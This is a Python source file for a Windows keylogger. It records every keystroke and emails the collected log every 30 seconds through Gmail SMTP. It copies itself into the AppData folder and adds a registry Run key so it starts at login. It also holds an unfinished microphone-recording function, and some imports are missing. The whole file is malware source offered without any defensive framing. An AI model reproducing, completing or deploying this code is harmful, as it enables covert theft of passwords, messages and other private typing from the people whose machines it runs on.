import keyboard
import threading
import os
import subprocess
import shutil
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import socket

log=""

def callback(event):
    key=event.name
    global log
    if len(key) == 1:
        log+=key
    if len(key) > 1:
            if key == "space":
                log += " "
            elif key == "enter":
                log += "[ENTER]\n"
            elif key == "decimal":
                log += "."
            else:
                key = key.replace(" ", "_")
                log += f"[{key.upper()}]" 

def microphone(self):
        fs = 44100
        seconds = 10
        obj = wave.open('sound.wav', 'w')
        obj.setnchannels(1)  # mono
        obj.setsampwidth(2)
        obj.setframerate(fs)
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        obj.writeframesraw(myrecording)
        sd.wait()

def sender():
    global log
    IPaddress=socket.gethostbyname(socket.gethostname())
    #print("log length: ",len(log))
    if (IPaddress!="127.0.0.1") and (len(log) > 200):     
        mail_content = log
        sender_address = ''
        sender_pass = ''
        receiver_address = ''
        message = MIMEMultipart()
        message['From'] = sender_address
        message['To'] = receiver_address
        message['Subject'] = 'A test mail sent by Python. It has an attachment.'
        message.attach(MIMEText(mail_content, 'plain'))
        try:
            session = smtplib.SMTP('smtp.gmail.com', 587)
            session.starttls() 
            session.login(sender_address, sender_pass) 
            text = message.as_string()
            session.sendmail(sender_address, receiver_address, text)
            session.quit() 
            #print("sent mail")
            
        except:
            pass
    log=""
    timer1=threading.Timer(30, sender)
    timer1.start()
    
keyboard.on_release(callback=callback)
sender()

loc =   os.environ["appdata"] + "\\keylog.exe"
if not os.path.exists(loc):
    shutil.copyfile(sys.executable,loc)
    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v keylog /t REG_SZ /d "' + loc + '"' ,shell=True)


